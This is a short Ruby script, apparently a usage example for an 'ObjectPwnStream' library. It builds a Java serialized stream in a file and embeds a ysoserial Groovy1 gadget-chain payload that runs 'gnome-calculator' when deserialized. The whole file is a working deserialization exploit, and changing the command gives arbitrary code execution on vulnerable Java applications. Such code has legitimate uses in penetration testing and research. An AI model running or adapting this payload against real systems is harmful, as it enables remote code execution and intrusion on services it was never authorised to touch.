require 'ObjectPwnStream'

pwnStream = ObjectPwnStream::PwnStream.new(file_path: "/tmp/to_deserialize_file")
pwnStream.connect!
pwnStream.open_output_stream!
pwnStream.write_long(12345)
pwnStream.ysoserial_generate!("../ysoserial.jar",
                              "Groovy1",
                              "gnome-calculator",
                              encode: true,
                              windows: false)
pwnStream.write_object(ysoserial: true)
pwnStream.close!